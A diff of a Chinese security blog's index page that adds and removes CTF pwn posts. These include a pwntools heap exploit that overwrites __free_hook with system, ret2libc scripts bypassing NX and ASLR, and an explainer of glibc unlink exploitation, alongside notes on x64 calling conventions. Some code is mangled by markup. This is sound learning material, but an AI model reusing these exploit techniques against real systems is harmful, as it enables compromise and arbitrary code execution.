@@ -131,50 +131,6 @@
       <div class="body-wrap">
         
   
-    <article id="post-一道doublefree的pwn" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/11/12/一道doublefree的pwn/">一道doublefree的pwn</a>
-    </h1>
-  
-      
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      <a href="/2017/11/12/一道doublefree的pwn/" class="archive-article-date">
-  	<time datetime="2017-11-12T06:56:16.000Z" itemprop="datePublished"><i class="icon-clock"></i>2017-11-12</time>
-</a>
-      
-      
-
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-
-
-  
     <article id="post-逆向及病毒分析技术" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -435,6 +391,74 @@
 
 
   
+    <article id="post-一道doublefree的pwn" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/02/27/一道doublefree的pwn/">一道unlink的pwn练习</a>
+    </h1>
+  
+      
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><a href="/image/一道doublefree的pwn/doublefree">doublefree</a></p>
+<p>from pwn import * </p>
+<p>p = process(‘./Werewolf’)<br>libc = ELF(‘./libc.so’)<br>elf = ELF(‘./Werewolf’)</p>
+<p>def add(sz, content):<br>    p.sendlineafter(“5.Exit\n”, “1”)<br>    p.sendlineafter(“size:\n”, str(sz))<br>    p.sendafter(“action:\n”, content)<br>def show(idx):<br>    p.sendlineafter(“5.Exit\n”, “2”)<br>    p.sendlineafter(“id\n”, str(idx))<br>def edit(idx, content):<br>    p.sendlineafter(“5.Exit\n”, “3”)<br>    p.sendlineafter(“id\n”, str(idx))<br>    p.sendafter(“action\n”, content)<br>def kill(idx):<br>    p.sendlineafter(“5.Exit\n”, “4”)<br>    p.sendlineafter(“id\n”, str(idx))</p>
+<p>add(0x60, ‘/bin/sh\x00\n’)<br>add(0x100, ‘b’<em>0x100)<br>add(0x100,  ‘c’</em>0x100)<br>add(0x100, ‘d’<em>0x100)<br>add(0x100, ‘e’</em>0x100)</p>
+<p>raw_input(‘<strong><strong><strong>__</strong></strong></strong>kill 1’)<br>kill(1)</p>
+<p>raw_input(‘<strong><strong><strong>___</strong></strong></strong>kill 3’)<br>kill(3)</p>
+<p>raw_input(‘<strong><strong><em>__</em></strong></strong>show 1’)<br>show(1)<br>p.recvuntil(“action : “)<br>main_arena = u64(p.recvuntil(“\n”, drop = True).ljust(8, “\x00”)) - 88<br>log.info(“leak : main_arena “ + hex(main_arena))</p>
+<p>raw_input(‘<strong><strong><strong>_</strong></strong></strong>show3’)<br>show(3)<br>p.recvuntil(“action : “)<br>heap = u64(p.recvuntil(“\n”, drop = True).ljust(8, “\x00”))<br>log.info(“leak : heap “ + hex(heap))</p>
+<p>off_main_arena = 0x3c1760<br>free_hook = main_arena - off_main_arena + libc.symbols[“__free_hook”]</p>
+<p>system = main_arena - off_main_arena + libc.symbols[“system”]<br>log.info(“free_hook : “ + hex(free_hook))<br>log.info(“system : “ + hex(system))</p>
+<p>#system_addr - main_arena = libc.symbols[‘system’] - off_main_arena</p>
+<p>#gdb.attach(proc.pidof(p)[0], ‘b *0x555555554eab’)<br>raw_input(‘<strong><strong><strong><em>__</em></strong></strong></strong>kill2’)<br>kill(2)</p>
+<p>raw_input(‘<strong><strong>__</strong></strong>add’)<br>payload  = “f”<em>0x110 + p64(0) + p64(0x100) + p64(heap - 0xF8) + p64(heap - 0xF0)<br>payload += “f”</em>0xE0 + p64(0x100) + p64(0x90) + “f”*0x80 + p64(0) + p64(0x101) + “\n”<br>add(0x300, payload)  # 5</p>
+<p>gdb.attach(proc.pidof(p)[0], ‘b *0x555555554eab’)<br>raw_input(‘<strong><strong>__</strong></strong>kill3’)<br>kill(3)</p>
+<p>raw_input(“<strong><strong>__</strong></strong>edit2”)<br>edit(2, p64(0x60) + p64(free_hook) + “\n”)</p>
+<p>raw_input(“<strong><strong>_</strong></strong>edit1”)<br>edit(1, p64(system) + “\n”)</p>
+<p>raw_input(‘<strong><strong>__</strong></strong>kill’)<br>kill(0)</p>
+<p>p.interactive()</p>
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      <a href="/2017/02/27/一道doublefree的pwn/" class="archive-article-date">
+  	<time datetime="2017-02-27T11:32:39.000Z" itemprop="datePublished"><i class="icon-clock"></i>2017-02-27</time>
+</a>
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
+	</div>
+
+      
+
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+
+
+  
     <article id="post-ZCTF2017-reverse1-writeup" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -487,7 +511,7 @@
 
 
   
-    <article id="post-pwnable.tw第一题starrt" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-一道unlink的pwn练习" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <input type="hidden" class="isFancy" />
@@ -497,7 +521,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2017/01/23/pwnable.tw第一题starrt/">pwnable.tw第一题start</a>
+      <a class="article-title" href="/2017/02/20/一道unlink的pwn练习/">一道unlink的pwn练习</a>
     </h1>
   
       
@@ -505,16 +529,16 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><a href="/image/pwnable.tw第一题start/printf1">printf1</a><br>
+        <p><a href="/image/一道unlink的pwn练习/unlink">unlink</a><br>
         <p class="article-more-link">
-          <a class="article-more-a"  href="/2017/01/23/pwnable.tw第一题starrt/#more">more >></a>
+          <a class="article-more-a"  href="/2017/02/20/一道unlink的pwn练习/#more">more >></a>
         </p>
       
     </div>
     <div class="article-info article-info-index">
       
-      <a href="/2017/01/23/pwnable.tw第一题starrt/" class="archive-article-date">
-  	<time datetime="2017-01-23T03:32:39.000Z" itemprop="datePublished"><i class="icon-clock"></i>2017-01-23</time>
+      <a href="/2017/02/20/一道unlink的pwn练习/" class="archive-article-date">
+  	<time datetime="2017-02-20T11:32:39.000Z" itemprop="datePublished"><i class="icon-clock"></i>2017-02-20</time>
 </a>
       
 	<div class="article-tag tagcloud">
@@ -539,7 +563,7 @@
 
 
   
-    <article id="post-pwn练习(三)之绕过NX和ALSR" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-Linux下x64程序的函数调用和堆栈(转)" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <input type="hidden" class="isFancy" />
@@ -549,7 +573,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2017/01/15/pwn练习(三)之绕过NX和ALSR/">pwn练习(三)之绕过NX和ALSR</a>
+      <a class="article-title" href="/2017/02/10/Linux下x64程序的函数调用和堆栈(转)/">堆溢出的unlink利用</a>
     </h1>
   
       
@@ -558,47 +582,16 @@
     <div class="article-entry" itemprop="articleBody">
       
         <a id="more"></a>
-<p>通过一个例子来看看如何使用ret2lib绕过NX和ASLR。</p>
-<p>程序很简单，看IDA:<br><img src="/image/pwn练习三之绕过NX和ALSR/1.png" alt="这里写图片描述"><br><img src="/image/pwn练习三之绕过NX和ALSR/2.png" alt="这里写图片描述"></p>
-<p>很明显的缓冲区溢出。checksec查看，程序开了NX保护，并且可以用命令查看，每次的堆栈都是发生了变化的，说明系统中开了ASLR保护的。<br>sudo cat /proc/[pid]/maps</p>
-<p>给出pwntools的两个脚本：<br>脚本一（给出libc的情况下）：<br>from pwn import *</p>
-<p>p = process(‘./rop’)<br>libc = ELF(‘./libc.so’)<br>elf = ELF(‘./rop’)</p>
-<p>offset = 0xd078-0xcff0+4</p>
-<p>write_plt = elf.symbols[‘write’]     #0x8048340<br>write_got = elf.got[‘write’]         #0x804a018<br>vuln_addr = elf.symbols[‘vuln’]     #0x804844d</p>
-<p>print ‘write_plt -&gt; ‘ + hex(write_plt)<br>print ‘write_got -&gt; ‘ + hex(write_got)<br>print ‘vuln -&gt; ‘ + hex(vuln_addr)</p>
-<p>payload = ‘A’ * offset<br>payload += p32(write_plt)<br>payload += p32(vuln_addr)<br>payload += p32(1)<br>payload += p32(write_got)<br>payload += p32(4)</p>
-<p>#gdb.attach(proc.pidof(p)[0], ‘b *0x8048474’)</p>
-<p>#raw_input()</p>
-<p>p.sendline(payload)</p>
-<p>write_addr = u32(p.recv(4))<br>print ‘write_addr -&gt; ‘ + hex(write_addr)</p>
-<p>system_addr = write_addr -  (libc.symbols[‘write’] - libc.symbols[‘system’] )<br>binsh_addr = write_addr -  (libc.symbols[‘write’] - next(libc.search(‘/bin/sh’)))</p>
-<p>payload = ‘A’ * offset<br>payload += p32(system_addr)<br>payload += p32(0xdeadbeef)<br>payload += p32(binsh_addr)</p>
-<p>p.sendline(payload)</p>
-<p>p.interactive()</p>
-<p>脚本二（未给出libc的情况下）:<br>from pwn import *</p>
-<p>p = process(‘./rop’)<br>elf = ELF(‘./rop’)</p>
-<p>offset = 0xd078-0xcff0+4</p>
-<p>write_plt = elf.symbols[‘write’]     #0x8048340<br>write_got = elf.got[‘write’]         #0x804a018<br>vuln_addr = elf.symbols[‘vuln’]     #0x804844d<br>read_plt = elf.symbols[‘read’]</p>
-<p>def leak(address):<br>    payload = ‘A’ * offset<br>    payload += p32(write_plt)<br>    payload += p32(vuln_addr)<br>    payload += p32(1)<br>    payload += p32(address)<br>    payload += p32(4)</p>
-<pre><code>p.sendline(payload)
-data = p.recv()
-print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
-return data
-</code></pre><p>d = DynELF(leak, elf = ELF(‘./rop’))<br>system_addr = d.lookup(“system”, “libc”)</p>
-<p>print ‘system_addr -&gt;’  + hex(system_addr)</p>
-<p>#write ‘/bib/sh’  to .bss</p>
-<p>bss_addr = 0x804a024</p>
-<p>payload = ‘A’ * offset<br>payload += p32(read_plt)<br>payload += p32(vuln_addr)<br>payload += p32(0)<br>payload += p32(bss_addr)<br>payload += p32(8)</p>
-<p>p.sendline(payload)<br>p.sendline(‘/bin/sh’)</p>
-<p>payload = ‘A’ * offset<br>payload += p32(system_addr)<br>payload += p32(vuln_addr)<br>payload += p32(bss_addr)</p>
-<p>p.sendline(payload)<br>p.interactive()</p>
+<p>首先先来科普一下64位CPU的混乱的术语：<br>术语    说明<br>AMD64    AMD研制的64位CPU（直接向下兼容x86）.<br>EM64T    Intel研制的兼容AMD64的CPU.<br>Intel64    EM64T的新名字.<br>IA-64    Intel和HP合作开发的64位CPU（可以通过模拟器间接兼容x86）.<br>x86    Intel的IA-32、IA-16、IA-8系列的CPU.<br>x64    AMD64&amp;Intel64.</p>
+<p>接下来就让我们一起看下x64中新增或变更的知识点（这里只介绍和逆向分析相关的，更详细内容可以参考Intel用户手册）。<br>64位<br>内存地址变成64位，当然程序使用的指针也相应的编程64位的指针。所以含有绝对地址（VA）的指令大小比原来增加了4字节。同样，寄存器的大小和栈的基本单元也变成64位。<br>内存<br>虚拟内存的实际大小为16TB（内核和用户空间各占8TB）。<br>通用寄存器<br>大小扩大到64（8字节），个数增加到18个（新增了R8~R15寄存器）。x64系统下的所有通用寄存器的名称均以字母”R”开头（x86以字母”E”开头），为了向下兼容，支持访问寄存器的8位、16位、32位（eg：AL、AX、EAX）。<br><strong>Note：</strong>64位本地模式中不使用段寄存器：CS、DS、ES、SS、FS、GS，他们仅用于向下兼容32位程序。<br>CALL/JMP指令<br>仍延续x86相同的指令，eg，CALL XXXXXXXX –&gt; FF15XXXXXXXX，其中XXXXXXXX“绝对地址”指向IAT区域的某个位置。但对地址解析方法不同了。具体解析方式暂时先不深入。<br>函数调用约定<br>Windows平台<br>整数和浮点数参数<br>32位：cdecl、stdcall、fastcall等几种，但64位统一为一种变形的fastcall。64位的fastcall中最多可以把函数的4个参数存储到寄存器中传递：<br>参数    整数型    浮点数型<br>1st    RCX    XMM0<br>2st    RDX    XMM1<br>3st    R8    XMM2<br>4st    R9    XMM2<br>超过4个参数，使用栈来传递，传递顺序依照“从右向左”。此外，函数返回时传递的参数过程中所用的栈由调用者清理。看上去64位的fastcall就像32位下的cdcel和fastcall的结合。函数的前4个参数虽然使用寄存器传递，但在栈中仍为这4个参数预留了空间（32个字节）。<br>Note：当整数和浮点数参数混合出现时，eg：<br>void func(float a, int b, double c, int d);<br>a放入XMM0中，b放入RDX，c放入XMM2，d放入R9。<br>这个存放的顺序很怪异，其实这是严格按照表2.1中整数和浮点数的4个参数一一对应，需要为没用的参数预留空间，eg，c参数没有放到XMM1中，XMM1被预留位置了。<br>指针参数<br>指针参数的传递遵循整数参数传递的方式。<br>结构体参数<br>结构体参数比较特殊，如果结构体长度小于64bit，则使用整数参数的传递规则。但如果是一个很大的结构体，那么应该还是要在堆栈中申请临时空间的（但ddk没有明说这一点，参考x86的规则应该如此）。<br>未声明函数调用<br>func1();<br>func2()<br>{<br>    func1(2, 1.0, 7);<br>}<br>在这种情况下，func1()的参数表其实不明确，那么参数的传递要怎样进行？这里采用了一个比较保守的规则，就是：整数参数还是按照寄存器映射关系放入对应的寄存器中，浮点数在按照映射关系放入XMM寄存器后，还需要按照整数参数的寄存器映射关系放入整数寄存器中一次，这就是“比较保守的规则”的意思。就现在这个例子而言，结果如下：<br>2在RCX中，1.0在RDX和XMM1中，7在R8中。</p>
+<p>Linux平台<br>和Windows平台的编译器一样，在Linux下的GCC编译器编译的函数，默认也是采用fastcall调用约定，但参数传递的方式却和Windows平台下截然不同，最多会把8个参数存储到寄存器中传递：<br>参数    整数型    浮点数型<br>1st    RDI    XMM0<br>2st    RSI    XMM1<br>3st    RDX    XMM2<br>4st    RCX    XMM3<br>5st    R8    XMM4<br>6st    R9    XMM5<br>7st    栈    XMM6<br>8st    栈    XMM7<br>这里当参数都是整数时大于6个参数时使用栈传递，浮点数型参数大于8个时，使用栈传递，传递顺序依照“从右向左”。<br>Note：<br>    • 当整数和浮点数参数混合出现时，eg：<br>void func(float a, int b, double c, int d);<br>a放在XMM0，b放在RDI，c放在XMM1，d放在RSI。<br>可以看到Linux的GCC下正浮混合时没有为没用到得参数预留空间。<br>    • RAX、RCX、RDX、RSI、RDI、R8、R9都是易失寄存器（它们的值经常被改变），所以被调用函数不必恢复它们的值，可以看到上述几个寄存器大多被用于函数传参，值被修改了也无妨。其他的寄存器是非易失寄存器（RBX、RBP、RSP、R10~R15），通常在函数中使用时需要保存原值，并在函数返回时恢复它们的值。<br>从Windows和Linux的64位函数调用约定不同可以总结出两点：<br>    • 随着x64位引入更多的寄存器后，传递参数也相应的更多使用寄存器。也可以说有钱更任性。<br>    • 两个平台的代码移植问题很不乐观。想了一下好像和逆向分析无关。</p>
 
       
     </div>
     <div class="article-info article-info-index">
       
-      <a href="/2017/01/15/pwn练习(三)之绕过NX和ALSR/" class="archive-article-date">
-  	<time datetime="2017-01-15T03:32:39.000Z" itemprop="datePublished"><i class="icon-clock"></i>2017-01-15</time>
+      <a href="/2017/02/10/Linux下x64程序的函数调用和堆栈(转)/" class="archive-article-date">
+  	<time datetime="2017-02-10T03:32:39.000Z" itemprop="datePublished"><i class="icon-clock"></i>2017-02-10</time>
 </a>
       
 	<div class="article-tag tagcloud">
@@ -623,7 +616,7 @@ return data
 
 
   
-    <article id="post-pwn练习(二)之修改got表" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-堆溢出的unlink利用" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <input type="hidden" class="isFancy" />
@@ -633,7 +626,7 @@ return data
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2017/01/04/pwn练习(二)之修改got表/">pwn练习(二)之修改got表</a>
+      <a class="article-title" href="/2017/02/04/堆溢出的unlink利用/">堆溢出的unlink利用</a>
     </h1>
   
       
@@ -641,16 +634,32 @@ return data
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><a href="/image/pwn练习二之修改got表/bf">bf</a></p>
-        <p class="article-more-link">
-          <a class="article-more-a"  href="/2017/01/04/pwn练习(二)之修改got表/#more">more >></a>
-        </p>
+        <a id="more"></a>
+<h2 id="0x01-关于chunk："><a href="#0x01-关于chunk：" class="headerlink" title="0x01 关于chunk："></a>0x01 关于chunk：</h2><p>当一个chunk被分配使用，最开始只有前两个变量会被用到，prev_size是前一块chunk的大小，前提是前一块chunk状态是free，如果前一块还在被使用，这4个字节会被前一块chunk共享使用以提高空间使用率，也就是说前一块chunk多了4字节。size是当前chunk的大小。如果当前块的状态是free，就会使用两个额外的变量：fd和bk，这两个变量指向双向链表中的前后节点。</p>
+<p>如何知道一个chunk是处于use还是free状态呢？<br>chunk的结构被强加了一个8字节对齐，这就导致块大小的最低三位总是零，所以只用高29位储存size，低三位储存其他东西，这种情况下，chunk的最低位被指派为标记它的前一块是已分配还是空闲。<br>比如<br>一个24（0x18）大小的块，它的前一块chunk是已分配:<br>0x00000018 | 0x1 = 0x00000019</p>
+<p>一个40（0x28）大小的块，它的前一块chunk是空闲:<br>0x00000028 | 0x0 = 0x00000028</p>
+<p>通过将自身chunk的地址+size就能得到下一个chunk的地址，然后检查它的头部最低位就能得到自己的状态</p>
+<h2 id="0x02-unlink利用"><a href="#0x02-unlink利用" class="headerlink" title="0x02 unlink利用"></a>0x02 unlink利用</h2><p>关于堆的unlink利用，在低版本的libc中，因为没加入校验，导致unlink的时候可以通过构造对快进行dordshoot，从而任意执行代码。<br>详情参考：<br><a href="http://www.tuicool.com/articles/E3Ezu2u" target="_blank" rel="external">http://www.tuicool.com/articles/E3Ezu2u</a></p>
+<p>主要是利用了free当前chunk时，会去检查前一个chunk和后一个chunk是否是空闲状态，如果是空闲，则会执行unlink，这就让我们有机可乘。但是，由于如今的glibc加入了校验机制，所以就要另想办法进行绕过。</p>
+<p>一下通过一个例子来说明：<br><img src="/image/堆溢出的unlink利用/1.png" alt="这里写图片描述"></p>
+<p>如图，通过两个malloc分配了两个内存：<br>ptr0 = malloc(128)  #返回0x804a008<br>ptr1 = malloc(128)  #返回0x804a090</p>
+<p>我们可以在内存中找到这两个变量存放的地址，假设为0x8049d60:<br><img src="/image/堆溢出的unlink利用/2.png" alt="这里写图片描述"></p>
+<p>这样，我们通过制造chunk0的溢出为如下图：<br><img src="/image/堆溢出的unlink利用/3.png" alt="这里写图片描述"></p>
+<p>这样，我们free掉chunk1之后，会检测chunk1的prev_size(被我们构造成0x80)，这时检测到前一个chunk（即chunk0）为空闲状态（实际上是我们伪造的），就会触发unlink（chunk0）：</p>
+<p>触发unlink时，会检测:（FD指针为chunk头部的指针地址，而不是数据段的指针地址）<br>FD-&gt;bk(0x8049d54+0xc) 的值是否为当前chunk(0x809a008)<br>BK-&gt;fd(0x8049d58+0x8) 的值知否为当前chunk(0x809a008)<br>因为上述两项满足条件，即绕过了检测，所以就glibc就会：<br>FD-&gt;bk = BK   #FD-&gt;bk 为(0x8049d54+0xc)， BK为0x8049d58 ，所以就是将0x8049d60的值设为0x8049d58<br>BK-&gt;fd = FD   #BK-&gt;fd为(0x8049d58+0x8), FD位0x8049d54, 所以就是将0x8049d60的值设为0x8049d54</p>
+<p>这样，在0x8049d60附近的内存就变成了：<br><img src="/image/堆溢出的unlink利用/4.png" alt="这里写图片描述"></p>
+<p>这样，我们如果在通过read(0, ptr1, len)写入数据时，就相当于在0x8049d54处输入数据，我们可以构造这样一个payload：</p>
+<p>payload = ‘A’ * 12 + p32(free_got)<br>内存又变成了：<br>这样，在0x8049d60附近的内存就变成了：<br><img src="/image/堆溢出的unlink利用/5.png" alt="这里写图片描述"></p>
+<p>当再一次通过read(0, ptr1, len)写入数据时，就将free_got指向的内存地址改成我们的输入了（可以是system），当再次调用free时，就是任我们摆布了。</p>
+<p><a href="/2016/04/09/一道unlink的pwn练习/index.html">一道练习加深对unlink的理解</a></p>
+<p>参考链接：<br><a href="http://www.cnblogs.com/0xmuhe/p/5190132.html" target="_blank" rel="external">http://www.cnblogs.com/0xmuhe/p/5190132.html</a><br><a href="http://www.tuicool.com/articles/E3Ezu2u" target="_blank" rel="external">http://www.tuicool.com/articles/E3Ezu2u</a><br><a href="http://www.tuicool.com/articles/IfYZri3" target="_blank" rel="external">http://www.tuicool.com/articles/IfYZri3</a></p>
+
       
     </div>
     <div class="article-info article-info-index">
       
-      <a href="/2017/01/04/pwn练习(二)之修改got表/" class="archive-article-date">
-  	<time datetime="2017-01-04T03:32:39.000Z" itemprop="datePublished"><i class="icon-clock"></i>2017-01-04</time>
+      <a href="/2017/02/04/堆溢出的unlink利用/" class="archive-article-date">
+  	<time datetime="2017-02-04T03:32:39.000Z" itemprop="datePublished"><i class="icon-clock"></i>2017-02-04</time>
 </a>
       
 	<div class="article-tag tagcloud">
@@ -753,7 +762,7 @@ var _hmt = _hmt || [];
     
     	<section class="tools-section tools-section-tag">
     			<div class="widget tagcloud" id="js-tagcloud">
-    				<a href="/tags/C/" style="font-size: 18.57px;">C</a> <a href="/tags/CrackMe/" style="font-size: 14.29px;">CrackMe</a> <a href="/tags/Hexo/" style="font-size: 11.43px;">Hexo</a> <a href="/tags/Linux/" style="font-size: 15.71px;">Linux</a> <a href="/tags/Windows/" style="font-size: 12.86px;">Windows</a> <a href="/tags/ctf/" style="font-size: 17.14px;">ctf</a> <a href="/tags/漏洞挖掘/" style="font-size: 18.57px;">漏洞挖掘</a> <a href="/tags/病毒分析/" style="font-size: 10px;">病毒分析</a> <a href="/tags/逆向/" style="font-size: 20px;">逆向</a>
+    				<a href="/tags/C/" style="font-size: 18.57px;">C</a> <a href="/tags/CrackMe/" style="font-size: 14.29px;">CrackMe</a> <a href="/tags/Hexo/" style="font-size: 11.43px;">Hexo</a> <a href="/tags/Linux/" style="font-size: 17.14px;">Linux</a> <a href="/tags/Windows/" style="font-size: 12.86px;">Windows</a> <a href="/tags/ctf/" style="font-size: 15.71px;">ctf</a> <a href="/tags/漏洞挖掘/" style="font-size: 18.57px;">漏洞挖掘</a> <a href="/tags/病毒分析/" style="font-size: 10px;">病毒分析</a> <a href="/tags/逆向/" style="font-size: 20px;">逆向</a>
     			</div>
     	</section>
     
